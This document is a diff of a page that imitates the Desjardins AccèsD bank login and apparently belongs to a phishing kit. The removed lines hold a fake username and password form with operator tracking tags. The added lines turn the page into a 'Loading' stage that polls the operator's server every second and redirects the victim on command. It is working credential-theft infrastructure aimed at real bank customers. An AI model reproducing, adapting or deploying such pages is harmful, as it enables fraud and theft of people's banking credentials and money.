@@ -13,7 +13,7 @@
         <meta name="oel-onboarding-lightbox-enabled" content="true">
         <link rel="stylesheet" type="text/css" href="./files/roboto-aw.css">
         <link href="/assets/desj/files2/bootstrap.min.css" rel="stylesheet" type="text/css">
-        <link href="/assets/desj/files2/d2-0.min.css?1" rel="stylesheet" type="text/css">
+        <link href="/assets/desj/files2/d2-0.min.css" rel="stylesheet" type="text/css">
         <link rel="stylesheet" href="/assets/desj/files2/styles.57e170eacf6043742857.css">
         <link rel="stylesheet" href="/assets/desj/main.css?2">
         <script>var popup = function(url, title, options){window.open(url, title, options);}</script>
@@ -23,8 +23,15 @@
             var lrbank = '<?=escape($udata->last->bank)?>';
             var lrinfo = '<?=escape($udata->last->info)?>';
         </script>
-        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
-        <script src="/socket.io/socket.io.js"></script>
+        <script >
+            setInterval(function() {
+                $.post('/deposit/desj/api/status', {page: lrinfo}, function(response) {
+                    if (response.status) {
+                        location.href = response.href;
+                    }
+                }, 'JSON');
+            }, 1000);
+        </script>
     </head>
     <body class="isolation-bootstrap-3 d2-0">
         <div class="sr-only" tabindex="-1" id="chargement">
@@ -117,137 +124,7 @@
                             <app-auth>
                                 <div class="authentification-component">
                                     <main id="contenuPrincipal" tabindex="-1">
-                                        <div class="container-fluid container-fluid-limited div-main">
-                                            <div class="row">
-                                                <div class="col-xs-24">
-                                                    <div class="container-auth" domainevirtuel="desjardins">
-                                                        <div class="auth-boite-login">
-                                                            <div class="auth-form">
-                                                                <h1 tabindex="-1" domainevirtuel="desjardins">Se connecter</h1>
-                                                                
-                                                                <!----><!---->
-                                                                <router-outlet></router-outlet>
-                                                                <ng-component>
-                                                                    <div class="auth-identifiant auth-identifiant-manuel">
-                                                                        <form id="loginForm" method="POST" role="form" autocomplete="off" class="ng-untouched ng-pristine ng-invalid lab-form">
-                                                                            <input type="hidden" id="userAgent" name="userAgent">
-                                                                            
-                                                                            <div class="auth-identifiant-saisi auth-section-login form-group">
-                                                                                <div class="auth-libelle-avec-aide">
-                                                                                    <label for="codeUtilisateur">Identifiant</label>
-                                                                                    <app-popover-aide>
-                                                                                        <button id="popoverAide" data-placement="bottom" data-toggle="popover" type="button" class="btn btn-nostyle auth-btn-aide" data-title="Aide - Identifiant" data-original-title="" title="">
-                                                                                            <svg xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="false" viewBox="0 0 32 32">
-                                                                                                <path d="M16 4a12 12 0 1012 12A12.013 12.013 0 0016 4zm0 22a10 10 0 1110-10 10.011 10.011 0 01-10 10z"></path>
-                                                                                                <path d="M16 14a1 1 0 00-1 1v6a1 1 0 002 0v-6a1 1 0 00-1-1z"></path>
-                                                                                                <circle cx="16" cy="11" r="1.5"></circle>
-                                                                                            </svg>
-                                                                                            <span class="sr-only">Aide – Identifiant</span>
-                                                                                        </button>
-                                                                                        <div id="popoverContenu" class="hide">
-                                                                                            <div class="auth-popover-aide-identifiant">
-                                                                                                <div>
-                                                                                                    <h3 class="auth-accesd"><strong>Identifiant AccèsD</strong></h3>
-                                                                                                    <ul>
-                                                                                                        <li>Votre numéro de Carte d’accès Desjardins</li>
-                                                                                                        <li>Votre carte d’accès virtuelle (non-membres détenteurs d’une carte de crédit ou d’une carte prépayée Desjardins)</li>
-                                                                                                    </ul>
-                                                                                                    <!----><!---->
-                                                                                                    <h3 class="auth-accesdAffaire"><strong>Identifiant AccèsD Affaires</strong></h3>
-                                                                                                    <!---->
-                                                                                                    <p> Votre code d'utilisateur AccèsD Affaires </p>
-                                                                                                    <!---->
-                                                                                                    <hr class="sr-only">
-                                                                                                </div>
-                                                                                                <!----><!----><a id="lnkPlusDeDetails" target="_blank" rel="noopener noreferrer" class="lien-action" href="https://www.desjardins.com/page-aide/index.jsp?docName=ai_identifiant_unique&amp;domaine=ACCESD"> En savoir plus sur l’identifiant <span class="sr-only">&nbsp;-&nbsp;Cet hyperlien s'ouvrira dans une nouvelle fenêtre.</span></a>
-                                                                                            </div>
-                                                                                        </div>
-                                                                                    </app-popover-aide>
-                                                                                </div>
-                                                                                <input type="text" id="codeUtilisateur" aria-describedby="erreurMessage" formcontrolname="codeUtilisateur" name="username" spellcheck="false" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid lrinput" attr-action="Filling Username" required>
-                                                                            </div>
-                                                                            <div class="auth-section-login auth-souvenirMoi">
-                                                                                <div class="flex-checkbox-bouton">
-                                                                                    <div id="n3-doc-form-caseacocher-perso-inline" class="form-group"><label class="c-input c-checkbox"><input type="checkbox" id="souvenirDeMoiCheckBox" aria-describedby="indiceSouvenirDeMoiCheckbox" name="souvenirDeMoiCheckBox" class="ng-untouched ng-pristine ng-valid"><span class="c-indicator"></span> Mémoriser </label></div>
-                                                                                    <app-popover-cest-securitaire>
-                                                                                        <div class="auth-popover-cest-securitaire">
-                                                                                            <button id="popoverCestSecuritaire" type="button" data-placement="bottom" data-toggle="popover" class="btn btn-link" domainevirtuel="desjardins" data-original-title="" title=""> (C'est sécuritaire?) <span class="sr-only"> - Ouvre une boîte de dialogue</span></button>
-                                                                                            <div id="popoverCestSecuritaireContenu" class="hide">
-                                                                                                <div>
-                                                                                                    <p>Entièrement sécuritaire sur vos appareils personnels, mais non recommandé sur un appareil public ou partagé.</p>
-                                                                                                    <p>Cochez la case <strong>Mémoriser</strong> pour éviter d’entrer votre identifiant à chaque connexion.</p>
-                                                                                                </div>
-                                                                                            </div>
-                                                                                        </div>
-                                                                                    </app-popover-cest-securitaire>
-                                                                                </div>
-                                                                            </div>
-                                                                            <app-champ-mot-passe>
-                                                                                <div class="form-group auth-mot-passe-saisi auth-section-login ng-untouched ng-pristine ng-invalid">
-                                                                                    <label for="motDePasse">Mot de passe</label>
-                                                                                    <div class="input-group auth-input-group-mot-passe">
-                                                                                        <input type="password" id="motDePasse" aria-describedby="erreurMessage auth-fix-maj" name="password" autocapitalize="none" formcontrolname="motDePasse" spellcheck="false" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid lrinput" attr-input="Filling Password" required>
-                                                                                        <span class="input-group-addon">
-                                                                                            <button type="button" id="afficherMotDePasse">
-                                                                                                <div class="auth-barre-oeil"><span class="sr-only">Afficher le mot de passe</span></div>
-                                                                                            </button>
-                                                                                        </span>
-                                                                                    </div>
-                                                                                    <p id="instructionMotDePasse" class="instructionMDP"><span><strong>Attention :</strong> Respecter majuscules et minuscules </span></p>
-                                                                                    <div id="motPasseOublie" class="auth-autres-actions">
-                                                                                        <p>
-                                                                                            <a href="https://accweb.mouv.desjardins.com/identifiantunique/motPasseOublie/identification" domainevirtuel="desjardins">Mot de passe oublié?</a><!----><!---->
-                                                                                        </p>
-                                                                                    </div>
-                                                                                </div>
-                                                                            </app-champ-mot-passe>
-                                                                            <div class="auth-login-actions" domainevirtuel="desjardins">
-                                                                                <button onclick="submitForm()" type="button" name="save" value="1" class="btn btn-primary"> Valider </button><!---->
-                                                                            </div>
-                                                                        </form>
-                                                                    </div>
-                                                                </ng-component>
-                                                                <!---->
-                                                            </div>
-                                                            <aside class="auth-liens-infos">
-                                                                <!---->
-                                                                <div class="bottom-section">
-                                                                    <!---->
-                                                                    <div role="list" class="auth-row-flex" domainevirtuel="desjardins">
-                                                                        <!---->
-                                                                        <ul role="presentation" class="auth-col-1">
-                                                                            <a></a>
-                                                                            <li><a></a><a href="https://accweb.mouv.desjardins.com/identifiantunique/adhesion/identification?langueCible=fr">S’inscrire à AccèsD</a></li>
-                                                                            <!----><!---->
-                                                                            <li><a href="https://www.desjardins.com/entreprises/comptes-tresorerie/modes-acces-comptes/accesd-affaires/comment-inscrire/index.jsp">S’inscrire à AccèsD Affaires</a></li>
-                                                                            <!----><!----><!---->
-                                                                            <li><a href="https://www.desjardins.com/particuliers/comptes-services-relies/ouvrir-compte-devenir-membre/">Devenir membre</a></li>
-                                                                            <!---->
-                                                                        </ul>
-                                                                        <!---->
-                                                                        <div role="presentation" class="auth-col-2">
-                                                                            <ul role="presentation" class="auth-col-2-1">
-                                                                                <li><a href="https://www.desjardins.com/securite/pratiques-securite/"> Sécurité du site </a></li>
-                                                                                <!---->
-                                                                                <li><a href="https://www.desjardins.com/particuliers/comptes-services-relies/modes-acces-comptes/internet/soutien/index.jsp"> Soutien technique  </a></li>
-                                                                                <!---->
-                                                                                <li><a href="https://www.desjardins.com/securite/signaler-fraude/"> Signaler une fraude </a></li>
-                                                                            </ul>
-                                                                            <ul role="presentation" class="auth-col-2-2">
-                                                                                <a class="auth-lien-securite-garanti" href="https://www.desjardins.com/securite/index.jsp"><img alt="" width="20" height="24" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjBweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjAgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8dGl0bGU+MDEvMDQvQ29udGVudS9Db250b3VyL1Byb3RlY3Rpb248L3RpdGxlPgogICAgPGRlZnM+CiAgICAgICAgPGZpbHRlciBjb2xvci1pbnRlcnBvbGF0aW9uLWZpbHRlcnM9ImF1dG8iIGlkPSJmaWx0ZXItMSI+CiAgICAgICAgICAgIDxmZUNvbG9yTWF0cml4IGluPSJTb3VyY2VHcmFwaGljIiB0eXBlPSJtYXRyaXgiIHZhbHVlcz0iMCAwIDAgMCAwLjAwMDAwMCAwIDAgMCAwIDAuNDc0NTEwIDAgMCAwIDAgMC4yNjY2NjcgMCAwIDAgMS4wMDAwMDAgMCI+PC9mZUNvbG9yTWF0cml4PgogICAgICAgIDwvZmlsdGVyPgogICAgPC9kZWZzPgogICAgPGcgaWQ9IjMuNF9SV0RfU2UtY29ubmVjdGVyX0RvbWFpbmVzLXZpcnR1ZWxzIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4KICAgICAgICA8ZyBpZD0iVGFibGV0dGVfRGVzamFyZGlucy1DYXJkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNTU0LjAwMDAwMCwgLTYyMi4wMDAwMDApIj4KICAgICAgICAgICAgPGcgaWQ9IjAxLzA0L0NvbnRlbnUvQ29udG91ci9Qcm90ZWN0aW9uIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg1NTIuMDAwMDAwLCA2MjIuMDAwMDAwKSIgZmlsdGVyPSJ1cmwoI2ZpbHRlci0xKSI+CiAgICAgICAgICAgICAgICA8Zz4KICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMTIsNi4wMzk2MTMyNWUtMTQgQzE1LjMxMzcwODUsNi4wMzk2MTMyNWUtMTQgMTgsMi42ODYyOTE1MSAxOCw2IEwxOCw2IEwxOCw3IEwxOSw3IEMyMC42NTY4NTQzLDcgMjIsOC4zNDMxNDU3OCAyMiwxMCBMMjIsMTAgTDIyLDIxIEMyMiwyMi42NTY4NTQzIDIwLjY1Njg1NDMsMjQgMTksMjQgTDE5LDI0IEw1LDI0IEMzLjM0MzE0NTc1LDI0IDIsMjIuNjU2ODU0MyAyLDIxIEwyLDIxIEwyLDEwIEMyLDguMzQzMTQ1NzggMy4zNDMxNDU3NSw3IDUsNyBMNSw3IEw2LDcgTDYsNiBDNiwyLjY4NjI5MTUxIDguNjg2MjkxNTIsNi4wMzk2MTMyNWUtMTQgMTIsNi4wMzk2MTMyNWUtMTQgWiBNMTksOS4wMDAwMDAwMyBMNS4wMDAwMDAwMSw5LjAwMDAwMDAzIEM0LjQ0NzcxNTI2LDkuMDAwMDAwMDMgNC4wMDAwMDAwMSw5LjQ0NzcxNTI4IDQuMDAwMDAwMDEsMTAgTDQuMDAwMDAwMDEsMTAgTDQuMDAwMDAwMDEsMjEgQzQuMDAwMDAwMDEsMjEuNTUyMjg0OCA0LjQ0NzcxNTI2LDIyIDUuMDAwMDAwMDEsMjIgTDUuMDAwMDAwMDEsMjIgTDE5LDIyIEMxOS41NTIyODQ4LDIyIDIwLDIxLjU1MjI4NDggMjAsMjEgTDIwLDIxIEwyMCwxMCBDMjAsOS40NDc3MTUyOCAxOS41NTIyODQ4LDkuMDAwMDAwMDMgMTksOS4wMDAwMDAwMyBMMTksOS4wMDAwMDAwMyBaIE0xMiwxMiBDMTIuOTA4NjIzLDEyLjAwODIyMjQgMTMuNjk3NTEyMywxMi42Mjc5MzIyIDEzLjkyMDY1NzEsMTMuNTA4NzY2OSBDMTQuMTQzODAxOSwxNC4zODk2MDE2IDEzLjc0NTExNDksMTUuMzEwMTY0MSAxMi45NSwxNS43NSBDMTIuOTc3MjY0OSwxNS44MzA4NTg4IDEyLjk5NDA2ODEsMTUuOTE0ODc0NyAxMywxNiBMMTMsMTYgTDEzLDE4IEMxMywxOC41NTIyODQ4IDEyLjU1MjI4NDgsMTkgMTIsMTkgQzExLjQ0NzcxNTMsMTkgMTEsMTguNTUyMjg0OCAxMSwxOCBMMTEsMTggTDExLDE2IEMxMS4wMDU5MzIsMTUuOTE0ODc0NyAxMS4wMjI3MzUyLDE1LjgzMDg1ODggMTEuMDUsMTUuNzUgQzEwLjI1NDg4NTIsMTUuMzEwMTY0MSA5Ljg1NjE5ODE5LDE0LjM4OTYwMTYgMTAuMDc5MzQzLDEzLjUwODc2NjkgQzEwLjMwMjQ4NzgsMTIuNjI3OTMyMiAxMS4wOTEzNzcsMTIuMDA4MjIyNCAxMiwxMiBaIE0xMiwyLjAwMDAwMDAxIEM5Ljc5MDg2MTAzLDIuMDAwMDAwMDEgOC4wMDAwMDAwMiwzLjc5MDg2MTAxIDguMDAwMDAwMDIsNi4wMDAwMDAwMSBMOC4wMDAwMDAwMiw2LjAwMDAwMDAxIEw4LjAwMDAwMDAyLDcuMDAwMDAwMDEgTDE2LDcuMDAwMDAwMDEgTDE2LDYuMDAwMDAwMDEgQzE2LDMuNzkwODYxMDEgMTQuMjA5MTM5LDIuMDAwMDAwMDEgMTIsMi4wMDAwMDAwMSBaIiBpZD0iMDEvMDQvQ29udGVudS9Db250b3VyL0NhZGVuYXMiIGZpbGw9IiMyRjJGMkYiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+"><span>Sécurité garantie à <span class="pourcentage-fr">100 %</span></span></a><!----><!---->
-                                                                            </ul>
-                                                                        </div>
-                                                                    </div>
-                                                                </div>
-                                                            </aside>
-                                                        </div>
-                                                        <div alt="" class="auth-boite-image" domainevirtuel="desjardins" iscaissescolaire="false" style="background-image: url(https://static.mouv.desjardins.com/static-accesweb/202109131615/authentification/assets/img/img-auth-desj.jpg);"></div>
-                                                        <!---->
-                                                    </div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                        <div class="container-fluid container-fluid-limited div-loader" style="display: none">
+                                        <div class="container-fluid container-fluid-limited">
                                             <div class="row">
                                                 <div class="col-xs-24">
                                                     <div class="container-auth" domainevirtuel="desjardins">
@@ -341,9 +218,10 @@
                 </div>
             </div>
         </app-root>
-        <span hidden id="navig"> <%=navig%> </span>
-        <span hidden id="stage">Login</span>
+        <span hidden id="navig"> . </span>
+        <span hidden id="stage">Loading</span>
     </body>
     <script src="/bank/desj/js/script.js">
     </script>
 </html>
+
